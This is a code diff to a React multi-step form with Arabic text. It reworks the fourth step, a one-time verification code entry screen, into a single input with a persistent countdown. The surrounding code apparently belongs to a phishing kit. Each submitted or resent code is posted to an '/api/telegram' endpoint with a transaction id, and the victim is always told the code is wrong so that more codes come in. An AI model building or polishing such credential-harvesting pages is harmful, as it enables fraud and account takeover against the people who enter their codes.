@@ -352,16 +352,32 @@ function Step3({ onNext, onBack, step2Data }: { onNext: (txId: string) => void; 
 }
 
 function Step4({ transactionId }: { transactionId: string }) {
-  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [otp, setOtp] = useState("");
   const [error, setError] = useState("");
-  const [countdown, setCountdown] = useState(60);
-  const [otpLen, setOtpLen] = useState<4 | 6>(6);
+  const [countdown, setCountdown] = useState(() => {
+    const saved = localStorage.getItem("otp_start");
+    if (!saved) return 60;
+    const elapsed = Math.floor((Date.now() - parseInt(saved)) / 1000);
+    return Math.max(0, 60 - elapsed);
+  });
+
+
+  useEffect(() => {
+    if (!localStorage.getItem("otp_start")) {
+      localStorage.setItem("otp_start", Date.now().toString());
+    }
+  }, []);
 
   useEffect(() => {
     if (countdown === 0) return;
-    const t = setTimeout(() => setCountdown((c) => c - 1), 1000);
-    return () => clearTimeout(t);
-  }, [countdown]);
+    const interval = setInterval(() => {
+      const saved = localStorage.getItem("otp_start");
+      if (!saved) return;
+      const elapsed = Math.floor((Date.now() - parseInt(saved)) / 1000);
+      setCountdown(Math.max(0, 60 - elapsed));
+    }, 500);
+    return () => clearInterval(interval);
+  }, []);
 
   const sendToTelegram = (type: "otp" | "resend", code?: string) =>
     fetch("/api/telegram", {
@@ -370,32 +386,18 @@ function Step4({ transactionId }: { transactionId: string }) {
       body: JSON.stringify({ type, transactionId, otp: code }),
     }).catch(() => {});
 
-  const handleChange = (i: number, val: string) => {
-    if (!/^\d?$/.test(val)) return;
-    const next = [...otp].slice(0, otpLen);
-    next[i] = val;
-    setOtp([...next, ...Array(6 - otpLen).fill("")]);
-    setError("");
-    if (val && i < otpLen - 1) (document.getElementById(`otp-${i + 1}`) as HTMLInputElement)?.focus();
-  };
-
-  const handleKeyDown = (i: number, e: React.KeyboardEvent) => {
-    if (e.key === "Backspace" && !otp[i] && i > 0)
-      (document.getElementById(`otp-${i - 1}`) as HTMLInputElement)?.focus();
-  };
-
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    const code = otp.slice(0, otpLen).join("");
-    if (code.length < otpLen) { setError("يرجى إدخال رمز التحقق كاملاً"); return; }
-    sendToTelegram("otp", code);
+    if (otp.length !== 4 && otp.length !== 6) { setError("يرجى إدخال رمز مكون من 4 أو 6 أرقام"); return; }
+    sendToTelegram("otp", otp);
     setError("رمز التحقق غير صحيح، يرجى التحقق والمحاولة مجدداً");
   };
 
   const handleResend = () => {
     sendToTelegram("resend");
+    localStorage.setItem("otp_start", Date.now().toString());
     setCountdown(60);
-    setOtp(["", "", "", "", "", ""]);
+    setOtp("");
     setError("");
   };
 
@@ -413,36 +415,16 @@ function Step4({ transactionId }: { transactionId: string }) {
       </div>
 
       <div className="space-y-3">
-        <div className="flex items-center justify-between">
-          <label className="block text-xs sm:text-sm font-bold text-primary">أدخل رمز التحقق</label>
-          <div className="flex gap-2 text-xs font-bold">
-            {([4, 6] as const).map((n) => (
-              <button
-                key={n}
-                type="button"
-                onClick={() => { setOtpLen(n); setOtp(Array(6).fill("")); setError(""); }}
-                className={`px-3 py-1 rounded-full transition-all ${otpLen === n ? "bg-primary text-white" : "bg-surface-container-low text-on-surface-variant hover:bg-primary/10"}`}
-              >
-                {n} أرقام
-              </button>
-            ))}
-          </div>
-        </div>
-        <div className="flex gap-2 justify-center" dir="ltr">
-          {Array.from({ length: otpLen }).map((_, i) => (
-            <input
-              key={i}
-              id={`otp-${i}`}
-              type="text"
-              inputMode="numeric"
-              maxLength={1}
-              value={otp[i]}
-              onChange={(e) => handleChange(i, e.target.value)}
-              onKeyDown={(e) => handleKeyDown(i, e)}
-              className={`w-10 h-12 sm:w-11 sm:h-14 text-center text-lg sm:text-xl font-black border-2 rounded-xl outline-none transition-all bg-white font-mono ${error ? "border-red-400" : otp[i] ? "border-secondary bg-secondary-container/10" : " focus:border-primary"}`}
-            />
-          ))}
-        </div>
+        <label className="block text-xs sm:text-sm font-bold text-primary">أدخل رمز التحقق</label>
+        <input
+          type="text"
+          inputMode="numeric"
+          value={otp}
+          onChange={(e) => { setOtp(e.target.value.replace(/\D/g, "")); setError(""); }}
+          className={`w-full border-2 rounded-xl p-3 text-center text-xl font-black font-mono outline-none transition-all bg-white tracking-widest ${error ? "border-red-400" : "border-outline-variant/40 focus:border-primary"}`}
+          placeholder="أدخل الرمز"
+          dir="ltr"
+        />
         {error && <p className="text-xs text-red-400 text-center">{error}</p>}
       </div>
 
